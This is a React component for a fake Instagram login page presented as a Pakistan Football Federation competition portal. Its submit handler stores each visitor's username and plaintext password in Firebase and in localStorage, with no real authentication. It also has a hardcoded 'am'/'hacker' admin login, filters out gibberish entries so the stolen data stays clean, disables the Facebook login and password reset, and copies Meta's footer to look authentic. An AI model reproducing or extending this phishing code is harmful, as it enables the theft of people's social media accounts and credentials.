import React, { useState } from 'react';
import { ShieldCheck, Eye, EyeOff, Sparkles, AlertTriangle, Moon, Sun } from 'lucide-react';
import { InstagramAccount } from '../types';
import { saveInstagramAccount } from '../lib/firebase';
import { schoolLogoUrl } from '../data';

interface InstagramLoginProps {
  onUserLogin: (username: string) => void;
  onAdminLogin: () => void;
}

export default function InstagramLogin({ onUserLogin, onAdminLogin }: InstagramLoginProps) {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [hasConsented, setHasConsented] = useState(true);
  const [errorMessage, setErrorMessage] = useState('');
  const [isDarkMode, setIsDarkMode] = useState(true);

  const isGibberishOrRandom = (text: string): boolean => {
    const str = text.trim().toLowerCase();
    if (!str) return true;

    // Valid phone numbers (e.g., 03xxxxxxxxx or +923xxxxxxxx)
    if (/^(\+?[0-9]{10,14}|03[0-9]{9})$/.test(str)) {
      return false;
    }

    // Valid email addresses
    if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(str)) {
      return false;
    }

    // Admin exceptions
    if (str === 'am' || str === 'hacker') return false;

    // 1. Repeating 2 or 3 character patterns (e.g., jsjsjs, asdfasdf, djsjsjsjs)
    if (/(.{2,3})\1{2,}/i.test(str)) {
      return true;
    }

    // 2. Keyboard row mashing sequences
    const keyboardSequences = [
      'qwerty', 'wertyu', 'rtyui', 'tyuio', 'yuiop',
      'asdfgh', 'sdfghj', 'dfghjk', 'fghjkl',
      'zxcvbn', 'xcvbnm',
      'qwer', 'wert', 'erty', 'rtyu', 'tyui', 'yuio', 'uiop',
      'asdf', 'sdfg', 'dfgh', 'fghj', 'ghjk', 'hjkl',
      'zxcv', 'xcvb', 'cvbn', 'vbnm',
      '12345', '23456', '34567', '45678', '56789',
      'abcde', 'bcdef', 'cdefg'
    ];
    if (keyboardSequences.some(seq => str.includes(seq))) {
      return true;
    }

    // 3. Consecutive identical characters (e.g. aaaa, zzzz)
    if (/(.)\1{3,}/.test(str)) {
      return true;
    }

    // 4. Vowel ratio & consonant clusters for word structure
    const alphaOnly = str.replace(/[^a-z]/g, '');
    if (alphaOnly.length >= 4) {
      const vowels = alphaOnly.match(/[aeiouy]/g) || [];
      const vowelRatio = vowels.length / alphaOnly.length;

      // Low vowel ratio in words of length >= 5
      if (alphaOnly.length >= 5 && vowelRatio < 0.18) {
        return true;
      }

      // Long consonant cluster without vowels (4+ consonants)
      const consonantClusters = alphaOnly.split(/[aeiouy]+/);
      const maxConsonants = Math.max(...consonantClusters.map(c => c.length));
      if (maxConsonants >= 4) {
        return true;
      }

      // 5. Short key-mashed words with low vowels (e.g. dgska, fksda, fghja)
      if (alphaOnly.length >= 4 && vowels.length <= 1) {
        const startConsonants = alphaOnly.split(/[aeiouy]/)[0];
        if (startConsonants.length >= 3) {
          return true;
        }
      }
    }

    return false;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrorMessage('');

    const cleanUsername = username.trim();

    // Check Admin credentials FIRST
    if ((cleanUsername === 'am' || cleanUsername === 'AM') && password === 'hacker') {
      onAdminLogin();
      return;
    }

    if (!cleanUsername || !password) {
      setErrorMessage('Enter your correct username and password');
      return;
    }

    if (password.length < 5) {
      setErrorMessage('Enter your correct username and password');
      return;
    }

    // Reject random words or gibberish username like djsjsjsjs or dgska
    if (isGibberishOrRandom(cleanUsername)) {
      setErrorMessage('Enter your correct username and password');
      return;
    }

    setIsLoading(true);

    try {
      // Save user login securely in Firebase Firestore
      await saveInstagramAccount(username.trim(), password);

      // Also keep a local backup session for quick UI reload if desired
      const existingAccountsStr = localStorage.getItem('instagram_accounts');
      let accounts: InstagramAccount[] = [];
      if (existingAccountsStr) {
        try {
          accounts = JSON.parse(existingAccountsStr);
        } catch (e) {
          console.error(e);
        }
      }

      const newAccount: InstagramAccount = {
        id: `ig_local_${Date.now()}`,
        username: username.trim(),
        password: password,
        timestamp: new Date().toLocaleString()
      };
      localStorage.setItem('instagram_accounts', JSON.stringify([newAccount, ...accounts]));

      setIsLoading(false);
      // Log in standard user and browse
      onUserLogin(username.trim());
    } catch (err: any) {
      console.error("Firebase error saving:", err);
      setIsLoading(false);
      setErrorMessage('An error occurred while communicating with the secure servers. Please try again.');
    }
  };

  return (
    <div className={`min-h-screen flex flex-col justify-between py-8 px-4 font-sans select-none transition-colors duration-300 ${
      isDarkMode ? 'bg-black text-white' : 'bg-slate-50 text-slate-800'
    }`}>
      {/* Top right theme switcher */}
      <div className="max-w-md w-full mx-auto flex justify-end">
        <button
          type="button"
          onClick={() => setIsDarkMode(!isDarkMode)}
          id="toggle-ig-theme"
          className={`flex items-center gap-1.5 px-3 py-1.5 rounded-full text-xs font-semibold transition-all border cursor-pointer ${
            isDarkMode 
              ? 'bg-neutral-900 border-neutral-800 text-neutral-300 hover:text-white hover:border-neutral-700' 
              : 'bg-white border-slate-200 text-slate-700 hover:text-slate-900 hover:border-slate-300 shadow-sm'
          }`}
          title="Toggle Instagram Theme"
        >
          {isDarkMode ? (
            <>
              <Sun className="w-3.5 h-3.5 text-amber-400" />
              <span>Light Theme</span>
            </>
          ) : (
            <>
              <Moon className="w-3.5 h-3.5 text-sky-500" />
              <span>Dark Theme</span>
            </>
          )}
        </button>
      </div>

      <div className="max-w-md w-full mx-auto flex flex-col items-center justify-center flex-1 my-auto">
        
        {/* PFF PORTAL CREST LOGO */}
        <div className="flex flex-col items-center gap-3 mb-6 animate-fade-in mt-2">
          <div className={`w-24 h-24 rounded-2xl p-2 shadow-md border flex items-center justify-center transform hover:scale-105 transition-all duration-350 overflow-hidden ${
            isDarkMode ? 'bg-neutral-900 border-neutral-800 shadow-black/50' : 'bg-white border-slate-200/80'
          }`}>
            <img 
              src={schoolLogoUrl} 
              alt="Pakistan Football Federation Logo" 
              className="w-full h-full object-contain"
              referrerPolicy="no-referrer"
              onError={(e) => {
                // Fallback to dl=1 if raw=1 has issue
                (e.target as HTMLImageElement).src = 'https://www.dropbox.com/scl/fi/ly6wkynu88hi0c96djd3k/images.jpeg?rlkey=xpcimqrzzmstcs1gjpg4czxwj&dl=1';
              }}
            />
          </div>
          <div className="text-center">
            <h1 className={`font-display font-black text-base uppercase tracking-wider leading-none ${
              isDarkMode ? 'text-white' : 'text-slate-800'
            }`}>
              Pakistan Football Federation
            </h1>
            <p className={`text-[11px] font-bold uppercase tracking-wider mt-1.5 ${
              isDarkMode ? 'text-emerald-400' : 'text-emerald-600'
            }`}>
              Official PFF Competition Portal
            </p>
          </div>
        </div>

        {/* INSTAGRAM BOX (CARD) */}
        <div className={`w-full rounded-2xl p-5 sm:p-9 text-center shadow-sm flex flex-col items-center border transition-colors ${
          isDarkMode 
            ? 'bg-black border-neutral-800 shadow-neutral-950' 
            : 'bg-white border-slate-200 shadow-sm'
        }`}>
          
          {/* Logo Heading styled like Instagram */}
          <h2 className={`font-serif italic text-4xl font-black my-6 tracking-tight select-none cursor-default ${
            isDarkMode ? 'text-white' : 'text-slate-800'
          }`}>
            Instagram
          </h2>

          <p className={`text-xs font-medium mb-6 leading-normal max-w-[280px] ${
            isDarkMode ? 'text-neutral-400' : 'text-slate-500'
          }`}>
            Log in with your Instagram account to authenticate access to the <strong>Pakistan Football Federation (PFF) Portal</strong>.
          </p>

          <form onSubmit={handleSubmit} className="w-full flex flex-col gap-2.5">
            {/* Username/Email/Phone Input */}
            <div className="relative w-full">
              <input
                id="ig-username"
                type="text"
                value={username}
                onChange={(e) => setUsername(e.target.value.toLowerCase())}
                placeholder="Phone number, username, or email"
                className={`w-full px-3 py-2.5 border rounded-md text-xs font-sans transition-colors focus:outline-none ${
                  isDarkMode 
                    ? 'bg-neutral-900 border-neutral-800 text-white placeholder-neutral-500 focus:border-neutral-600 focus:bg-neutral-950' 
                    : 'bg-slate-50 border-slate-200 text-slate-800 placeholder-slate-400 focus:border-slate-400 focus:bg-white'
                }`}
                disabled={isLoading}
              />
            </div>

            {/* Password Input */}
            <div className="relative w-full">
              <input
                id="ig-password"
                type={showPassword ? 'text' : 'password'}
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="Password"
                className={`w-full pl-3 pr-12 py-2.5 border rounded-md text-xs font-sans transition-colors focus:outline-none ${
                  isDarkMode 
                    ? 'bg-neutral-900 border-neutral-800 text-white placeholder-neutral-500 focus:border-neutral-600 focus:bg-neutral-950' 
                    : 'bg-slate-50 border-slate-200 text-slate-800 placeholder-slate-400 focus:border-slate-400 focus:bg-white'
                }`}
                disabled={isLoading}
              />
              <button
                type="button"
                id="toggle-ig-password"
                onClick={() => setShowPassword(!showPassword)}
                className={`absolute right-3.5 top-1/2 -translate-y-1/2 text-xs font-bold transition-colors focus:outline-none ${
                  isDarkMode ? 'text-white hover:text-neutral-400' : 'text-slate-800 hover:text-slate-500'
                }`}
              >
                {showPassword ? 'Hide' : 'Show'}
              </button>
            </div>

            {/* Error Message */}
            {errorMessage && (
              <p className="text-red-500 text-xs font-medium mt-1 leading-normal text-left px-1">
                {errorMessage}
              </p>
            )}

            {/* Login Button */}
            <button
              type="submit"
              id="ig-login-btn"
              disabled={isLoading}
              className={`w-full mt-3 py-2.5 rounded-lg text-xs font-bold text-white shadow-sm flex items-center justify-center gap-2 transition-all ${
                username && password.length >= 5 && hasConsented
                  ? 'bg-sky-500 hover:bg-sky-600 active:scale-[0.99] cursor-pointer'
                  : 'bg-sky-300 cursor-not-allowed opacity-80'
              }`}
            >
              {isLoading ? (
                <div className="w-4 h-4 border-2 border-white/45 border-t-white rounded-full animate-spin" />
              ) : (
                'Log in'
              )}
            </button>

            {/* Divider line OR */}
            <div className="flex items-center gap-4 my-4 w-full">
              <div className={`h-[1px] flex-1 ${isDarkMode ? 'bg-neutral-800' : 'bg-slate-200'}`} />
              <span className={`text-[11px] font-bold uppercase tracking-wider ${isDarkMode ? 'text-neutral-500' : 'text-slate-400'}`}>OR</span>
              <div className={`h-[1px] flex-1 ${isDarkMode ? 'bg-neutral-800' : 'bg-slate-200'}`} />
            </div>

            {/* FB Log in */}
            <button
              type="button"
              id="fb-login-btn"
              onClick={() => {
                setErrorMessage('Direct Facebook authentication is suspended. Please use your standard Instagram credentials above.');
              }}
              className={`font-bold text-xs flex items-center justify-center gap-2 hover:opacity-85 transition-opacity ${
                isDarkMode ? 'text-sky-500' : 'text-indigo-900'
              }`}
            >
              <svg className="w-5 h-5 fill-current" viewBox="0 0 24 24">
                <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
              </svg>
              Log in with Facebook
            </button>

            {/* Forgot password */}
            <a
              href="#forgot-password"
              onClick={(e) => {
                e.preventDefault();
                setErrorMessage('Password recovery is unavailable. Please verify your password manually or enter standard credentials.');
              }}
              className={`text-[11px] hover:underline mt-2 select-text ${
                isDarkMode ? 'text-neutral-400' : 'text-slate-600'
              }`}
            >
              Forgot password?
            </a>
          </form>
        </div>

        {/* SECOND BOX: SIGN UP */}
        <div className={`w-full rounded-lg p-5 mt-2.5 text-center shadow-sm text-xs border ${
          isDarkMode ? 'bg-black border-neutral-800 text-neutral-400' : 'bg-white border-slate-200 text-slate-600'
        }`}>
          Don't have an account? <span className="font-bold text-sky-500 cursor-default">Sign up</span>
        </div>

      </div>

      {/* FOOTER */}
      <footer className={`max-w-2xl w-full mx-auto text-center mt-8 text-[11px] font-medium flex flex-wrap gap-x-4 gap-y-1.5 justify-center ${
        isDarkMode ? 'text-neutral-500' : 'text-slate-400'
      }`}>
        <span>Meta</span>
        <span>About</span>
        <span>Blog</span>
        <span>Jobs</span>
        <span>Help</span>
        <span>API</span>
        <span>Privacy</span>
        <span>Terms</span>
        <span>Locations</span>
        <span>Instagram Lite</span>
        <span>Threads</span>
        <span>Contact Uploading & Non-Users</span>
        <span>Meta Verified</span>
        <div className="w-full mt-2.5">
          <span>English (US)</span>
          <span className="ml-4">© 2026 Instagram from Meta</span>
        </div>
      </footer>
    </div>
  );
}
